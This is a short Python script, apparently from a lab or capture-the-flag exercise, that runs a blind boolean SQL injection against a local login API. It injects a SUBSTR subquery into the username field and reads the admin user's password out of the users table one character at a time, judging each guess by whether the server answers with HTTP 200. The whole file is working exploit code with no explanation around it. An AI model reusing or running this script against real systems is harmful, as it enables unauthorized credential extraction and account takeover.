import string
import requests


URL = "http://localhost:3001/api/auth/login"
TARGET_USER = "admin"
searchspace = string.ascii_letters + string.digits + "{}-_."
solution = ""


while True:
    found = False

    for char in searchspace:
        data = {
            "username": (
                f"{TARGET_USER}' AND SUBSTR((SELECT password FROM users "
                f"WHERE username='{TARGET_USER}'), {len(solution) + 1}, 1) = "
                f"'{char}' --"
            ),
            "password": "password",
        }

        request = requests.post(URL, json=data)
        print(request.text)

        if request.status_code == 200:
            found = True
            solution += char
            print(solution)
            break

    if not found:
        print("IM HERE", solution)
        break
